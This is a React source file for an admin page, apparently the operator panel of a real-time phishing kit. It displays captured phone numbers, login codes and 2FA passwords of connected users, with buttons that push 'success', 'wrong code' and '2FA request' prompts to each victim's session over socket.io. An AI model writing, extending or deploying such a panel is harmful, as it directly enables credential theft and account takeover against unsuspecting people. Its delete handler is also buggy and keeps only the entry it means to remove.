import React, { memo, useState, useEffect, useCallback } from "react";
import io from 'socket.io-client';
import './index.scss';
import { toast, ToastContainer, Zoom } from "react-toastify";
import 'react-toastify/dist/ReactToastify.css';

const sockets = io(process.env.API_URL + '/userconnect', {
  autoConnect: false,
  reconnectionAttempts: 5,
  timeout: 4000,
  reconnectionDelay: 400,
  reconnectionDelayMax: 2500
});

const AdminPage = () => {
    const [users, setUsers] = useState([]);

    useEffect(() => {

        const connectHandler = () => {
          console.log('connect');
        }
    
        sockets.on('connect', connectHandler);
        sockets.connect();
    
        return () => {
          sockets.off('connect', connectHandler)
        }
    }, [])

    useEffect(() => {

      try{
        sockets.emit('get-users', null,  (data) => {
          setUsers(data);
          console.log(data);
        })
      } catch(e){
        console.log(e)
      }
      
    }, []);

    const updateUsers = () => {
      try{
        sockets.emit('get-users', null,  (data) => {
          setUsers(data);
          console.log(data);
        })
      } catch(e){
        console.log(e)
      }
    }

    const toFaHandler = useCallback((e) => {
      try{
        const socket_id = e.target.dataset.socket_id;
        sockets.emit('admin:2fa', { socket_id });
        toast.success('Запрос 2FA')
      } catch(e){
        console.log(e)
      }
    }, []);

    const errorToFaHandler = useCallback((e) => {
      try{
        const socket_id = e.target.dataset.socket_id;
        sockets.emit('admin:error-2fa', { socket_id })
        toast.success('Ошибка 2FA')
      } catch(e){
        console.log(e)
      }
    }, []);


    const errorCodeHandler = useCallback((e) => {
      try{
        const socket_id = e.target.dataset.socket_id;
        sockets.emit('admin:error-code', { socket_id })
        toast.success('Ошибка кода')
      } catch(e){
        console.log(e)
      }
    }, []);

    const nextHandler = useCallback((e) => {
      try{
        const socket_id = e.target.dataset.socket_id;
        sockets.emit('next', { socket_id })
        toast.success('Успех')
      } catch(e){
        console.log(e)
      }
    }, []);

    const deleteHandler = useCallback((e) => {
      try{
        const user_id = e.target.dataset.user_id;
        setUsers(prev => prev.filter(v => v.user_id === user_id));
        sockets.emit('admin:delete', { user_id })
        toast.success('Удалено')
      } catch(e){
        console.log(e)
      }
    }, []);
    

    return <div className='admin-page'>
        <div className='admin-page__toolbar'>
          <button onClick={updateUsers}>Обновить</button>
        </div>
        <div className="items">
          <div className="item">
            <div className="item__title">Номер</div>
            <div className="item__title">Код</div>
            <div className="item__title">2FA</div>
            <div className="item__title">actions</div>
          </div>

          {users.map(v => <div className="item" key={v.user_id}>
            <div className="item__phone">{v.phone}<span>{v.user_id}</span></div>
            <div className="item__code">{v.code}</div>
            <div className="item__password">{v.password}</div>
            <div className="item__controls">
              <div className="btn btn--green" onClick={nextHandler} data-socket_id={v.socket_id}>Успех</div>
              <div className="btn btn--red" onClick={errorCodeHandler} data-socket_id={v.socket_id}>Неверный код</div>
              <div className="btn btn--blue" onClick={toFaHandler} data-socket_id={v.socket_id}>Запрос 2FA</div>
              <div className="btn btn--yellow" onClick={errorToFaHandler} data-socket_id={v.socket_id}>Неверный 2FA</div>
              <div className="btn btn--black" onClick={deleteHandler} data-user_id={v.user_id}>Удалить</div>
            </div>
          </div>)}

        </div>
        <ToastContainer 
        position="top-right"
        autoClose={500}
        limit={4}
        hideProgressBar
        pauseOnFocusLoss
        newestOnTop={false}
        closeOnClick
        rtl={false}
        draggable={false}
        pauseOnHover={false}
        theme="colored"
        transition={Zoom}
        style={{ paddingRight: '10px', paddingBottom: '10px', width: '220px', height: '40px', borderRadius: '10px' }}
      />;
    </div>
}

export default memo(AdminPage);